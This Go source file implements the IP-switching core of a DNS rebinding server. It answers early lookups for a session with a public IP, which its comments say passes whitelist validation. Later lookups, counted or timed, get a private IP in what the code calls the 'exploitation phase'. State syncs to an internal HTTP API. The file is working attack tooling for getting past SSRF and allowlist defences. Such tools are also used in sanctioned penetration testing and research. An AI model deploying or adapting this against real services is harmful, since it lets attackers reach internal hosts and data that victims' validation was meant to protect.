package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"
)

// RebindConfig holds the state for a single DNS rebinding session.
type RebindConfig struct {
	UUID         string     `json:"uuid"`
	PublicIP     string     `json:"public_ip"`
	PrivateIP    string     `json:"private_ip"`
	RequestCount int        `json:"request_count"`
	SwitchAfter  int        `json:"switch_after"`   // count-based: switch to PrivateIP after N requests
	SwitchAtTime *time.Time `json:"switch_at_time"` // time-based: switch after this absolute time
}

// Rebinder manages DNS rebinding state in memory and persists it via the HTTP server API.
// The first SwitchAfter DNS lookups return PublicIP (passes whitelist validation).
// Subsequent lookups return PrivateIP (exploitation phase).
type Rebinder struct {
	mu             sync.Mutex
	cache          map[string]*RebindConfig
	httpServerURL  string
	internalAPIKey string
	httpCli        *http.Client
}

func NewRebinder(httpServerURL, internalAPIKey string) *Rebinder {
	return &Rebinder{
		cache:          make(map[string]*RebindConfig),
		httpServerURL:  httpServerURL,
		internalAPIKey: internalAPIKey,
		httpCli:        &http.Client{Timeout: 3 * time.Second},
	}
}

// GetIP returns the IP to serve for the given rebind UUID.
// Falls back to publicIPFallback if no rebind config exists.
func (r *Rebinder) GetIP(uuid, publicIPFallback string) string {
	r.mu.Lock()
	defer r.mu.Unlock()

	cfg, ok := r.cache[uuid]
	if !ok {
		// Try to fetch from HTTP server
		cfg = r.fetchFromServer(uuid)
		if cfg == nil {
			return publicIPFallback
		}
		r.cache[uuid] = cfg
	}

	// Time-based mode takes priority over count-based
	if cfg.SwitchAtTime != nil && !cfg.SwitchAtTime.IsZero() {
		if time.Now().After(*cfg.SwitchAtTime) {
			log.Printf("[REBIND] uuid=%s → PrivateIP=%s (time-based, switched at %s)", uuid, cfg.PrivateIP, cfg.SwitchAtTime.Format(time.RFC3339))
			return cfg.PrivateIP
		}
		log.Printf("[REBIND] uuid=%s → PublicIP=%s (time-based, switches at %s)", uuid, cfg.PublicIP, cfg.SwitchAtTime.Format(time.RFC3339))
		return cfg.PublicIP
	}

	// Count-based mode
	cfg.RequestCount++
	go r.persistCount(uuid, cfg.RequestCount)

	if cfg.RequestCount <= cfg.SwitchAfter {
		log.Printf("[REBIND] uuid=%s count=%d → PublicIP=%s (validation phase)", uuid, cfg.RequestCount, cfg.PublicIP)
		return cfg.PublicIP
	}

	log.Printf("[REBIND] uuid=%s count=%d → PrivateIP=%s (exploitation phase)", uuid, cfg.RequestCount, cfg.PrivateIP)
	return cfg.PrivateIP
}

// Register adds a new rebind config to the local cache.
// Called by the Rebinder.fetchFromServer when the HTTP server returns config.
func (r *Rebinder) Register(cfg *RebindConfig) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.cache[cfg.UUID] = cfg
}

func (r *Rebinder) fetchFromServer(uuid string) *RebindConfig {
	resp, err := r.doReq(http.MethodGet, "/internal/rebind/"+uuid, nil)
	if err != nil || resp == nil {
		return nil
	}
	var cfg RebindConfig
	if err := json.NewDecoder(resp.Body).Decode(&cfg); err != nil {
		resp.Body.Close()
		return nil
	}
	resp.Body.Close()
	return &cfg
}

func (r *Rebinder) persistCount(uuid string, count int) {
	payload := map[string]int{"request_count": count}
	body, _ := json.Marshal(payload)
	resp, err := r.doReq(http.MethodPatch, "/internal/rebind/"+uuid+"/count", bytes.NewReader(body))
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

func (r *Rebinder) doReq(method, path string, body *bytes.Reader) (*http.Response, error) {
	var req *http.Request
	var err error
	if body != nil {
		req, err = http.NewRequest(method, r.httpServerURL+path, body)
	} else {
		req, err = http.NewRequest(method, r.httpServerURL+path, nil)
	}
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Internal-Key", r.internalAPIKey)
	req.Header.Set("Content-Type", "application/json")
	return r.httpCli.Do(req)
}
